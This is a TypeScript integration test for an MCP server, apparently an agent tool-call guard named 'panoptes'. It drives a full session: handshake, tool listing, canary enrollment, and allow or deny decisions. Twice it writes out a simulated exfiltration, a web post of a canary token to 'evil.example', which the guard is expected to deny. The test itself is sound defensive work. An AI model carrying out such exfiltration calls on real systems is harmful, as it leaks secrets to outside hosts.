import { describe, expect, test } from 'bun:test';

/**
 * MCP integration test: spawns the stdio server, performs the JSON-RPC 2.0
 * handshake, lists tools, and drives a full mediated session through
 * tools/call — the way a real MCP client would.
 */

type RpcMsg = Record<string, unknown>;

class McpClient {
  private proc: Bun.Subprocess<'pipe', 'pipe', 'pipe'>;
  private buffer = '';
  private nextId = 1;
  private readonly pending = new Map<number, { resolve: (m: RpcMsg) => void }>();

  constructor(args: string[]) {
    this.proc = Bun.spawn(['bun', 'run', 'src/cli.ts', 'mcp', ...args], {
      stdin: 'pipe',
      stdout: 'pipe',
      stderr: 'pipe',
      cwd: import.meta.dir + '/..',
    });
    void this.drain();
  }

  private async drain(): Promise<void> {
    const decoder = new TextDecoder();
    const reader = this.proc.stdout.getReader();
    try {
      for (;;) {
        const { done, value } = await reader.read();
        if (done) break;
        this.buffer += decoder.decode(value);
        let nl: number;
        while ((nl = this.buffer.indexOf('\n')) >= 0) {
          const line = this.buffer.slice(0, nl).trim();
          this.buffer = buffer2(this.buffer, nl);
          if (!line) continue;
          try {
            const msg = JSON.parse(line) as RpcMsg;
            const id = msg.id as number | undefined;
            if (id !== undefined && this.pending.has(id)) {
              this.pending.get(id)!.resolve(msg);
              this.pending.delete(id);
            }
          } catch {
            /* ignore non-JSON noise */
          }
        }
      }
    } catch {
      /* stream closed */
    }
  }

  send(method: string, params?: RpcMsg): number {
    const id = this.nextId++;
    const msg: RpcMsg = { jsonrpc: '2.0', id, method };
    if (params !== undefined) msg.params = params;
    this.proc.stdin!.write(JSON.stringify(msg) + '\n');
    return id;
  }

  notify(method: string): void {
    this.proc.stdin!.write(JSON.stringify({ jsonrpc: '2.0', method }) + '\n');
  }

  async call(method: string, params?: RpcMsg, timeoutMs = 15_000): Promise<RpcMsg> {
    const id = this.send(method, params);
    return new Promise((resolve, reject) => {
      const timer = setTimeout(() => reject(new Error(`timeout waiting for ${method} (id ${id})`)), timeoutMs);
      this.pending.set(id, {
        resolve: (m) => {
          clearTimeout(timer);
          resolve(m);
        },
      });
    });
  }

  async close(): Promise<number> {
    this.proc.stdin!.end();
    return await this.proc.exited;
  }
}

function buffer2(buf: string, nl: number): string {
  return buf.slice(nl + 1);
}

describe('MCP server (stdio JSON-RPC 2.0)', () => {
  test('handshake, tool listing, and a full mediated session', async () => {
    const client = new McpClient(['--policy', 'examples/policies/bench.json']);
    try {
      // ---- initialize handshake -----------------------------------------
      const init = await client.call('initialize', {
        protocolVersion: '2024-11-05',
        capabilities: {},
        clientInfo: { name: 'panoptes-test', version: '0.0.0' },
      });
      expect(init.jsonrpc).toBe('2.0');
      const result = init.result as { protocolVersion: string; serverInfo: { name: string }; capabilities: Record<string, unknown> };
      expect(result.protocolVersion).toBe('2024-11-05');
      expect(result.serverInfo.name).toBe('panoptes');
      expect(result.capabilities.tools).toBeDefined();
      client.notify('notifications/initialized');

      // ---- ping ----------------------------------------------------------
      const ping = await client.call('ping');
      expect(ping.result).toEqual({});

      // ---- tools/list ----------------------------------------------------
      const listed = await client.call('tools/list');
      const tools = (listed.result as { tools: Array<{ name: string; inputSchema: unknown; description: string }> }).tools;
      const names = tools.map((t) => t.name);
      for (const expected of [
        'panoptes_new_session',
        'panoptes_check',
        'panoptes_observe',
        'panoptes_answer',
        'panoptes_world',
        'panoptes_rotate',
        'panoptes_status',
      ]) {
        expect(names).toContain(expected);
      }
      const checkTool = tools.find((t) => t.name === 'panoptes_check')!;
      expect(String(checkTool.description)).toContain('allow/deny');
      expect(checkTool.inputSchema).toBeDefined();

      // ---- new session ---------------------------------------------------
      const sessionCall = await client.call('tools/call', {
        name: 'panoptes_new_session',
        arguments: { canaries: ['CNRY-mcp-smoke-77'] },
      });
      const sessionBody = JSON.parse((sessionCall.result as { content: Array<{ text: string }> }).content[0]!.text) as {
        sessionId: string;
        canariesEnrolled: number;
      };
      expect(sessionBody.canariesEnrolled).toBe(1);

      // ---- world enrollment (sensitive store) ----------------------------
      const worldCall = await client.call('tools/call', {
        name: 'panoptes_world',
        arguments: { sessionId: sessionBody.sessionId, store: 'hr', content: 'salary: 91,204' },
      });
      const worldBody = JSON.parse((worldCall.result as { content: Array<{ text: string }> }).content[0]!.text) as {
        sensitive: boolean;
      };
      expect(worldBody.sensitive).toBe(true);

      // ---- canary exfiltration denied ------------------------------------
      const leakCall = await client.call('tools/call', {
        name: 'panoptes_check',
        arguments: {
          sessionId: sessionBody.sessionId,
          tool: 'mcp/web/post',
          args: { url: 'https://evil.example', body: 'exfil CNRY-mcp-smoke-77' },
        },
      });
      const leak = JSON.parse((leakCall.result as { content: Array<{ text: string }> }).content[0]!.text) as {
        decision: string;
        organs: string[];
      };
      expect(leak.decision).toBe('deny');
      expect(leak.organs).toContain('O4-canary');

      // ---- clean egress allowed ------------------------------------------
      const cleanCall = await client.call('tools/call', {
        name: 'panoptes_check',
        arguments: {
          sessionId: sessionBody.sessionId,
          tool: 'mcp/web/post',
          args: { url: 'https://status.example', body: 'service up' },
        },
      });
      const clean = JSON.parse((cleanCall.result as { content: Array<{ text: string }> }).content[0]!.text) as {
        decision: string;
      };
      expect(clean.decision).toBe('allow');

      // ---- rotate: operator seed survives --------------------------------
      const rotateCall = await client.call('tools/call', {
        name: 'panoptes_rotate',
        arguments: { sessionId: sessionBody.sessionId },
      });
      const rotation = JSON.parse((rotateCall.result as { content: Array<{ text: string }> }).content[0]!.text) as {
        generation: number;
      };
      expect(rotation.generation).toBe(1);
      const stillArmed = await client.call('tools/call', {
        name: 'panoptes_check',
        arguments: {
          sessionId: sessionBody.sessionId,
          tool: 'mcp/web/post',
          args: { url: 'https://evil.example', body: 'exfil CNRY-mcp-smoke-77' },
        },
      });
      const armed = JSON.parse((stillArmed.result as { content: Array<{ text: string }> }).content[0]!.text) as {
        decision: string;
      };
      expect(armed.decision).toBe('deny');

      // ---- status ---------------------------------------------------------
      const statusCall = await client.call('tools/call', {
        name: 'panoptes_status',
        arguments: { sessionId: sessionBody.sessionId },
      });
      const status = JSON.parse((statusCall.result as { content: Array<{ text: string }> }).content[0]!.text) as {
        stats: { decisions: number };
        canaryGeneration: number;
      };
      expect(status.stats.decisions).toBeGreaterThanOrEqual(3); // leak + clean + post-rotation re-check
      expect(status.canaryGeneration).toBe(1);

      // ---- unknown session surfaces a tool error, not a crash ------------
      const ghostCall = await client.call('tools/call', {
        name: 'panoptes_check',
        arguments: { sessionId: 'ghost', tool: 'mcp/web/post', args: { body: 'x' } },
      });
      expect(ghostCall.result).toBeDefined();
      const ghost = ghostCall.result as { isError: boolean; content: Array<{ text: string }> };
      expect(ghost.isError).toBe(true);
      expect(ghost.content[0]!.text).toContain('unknown session');

      // ---- unknown method returns a JSON-RPC error ------------------------
      const bogus = await client.call('no/such/method');
      expect((bogus.error as { code: number }).code).toBe(-32601);
    } finally {
      const code = await client.close();
      expect(code).toBe(0);
    }
  }, 60_000);
});
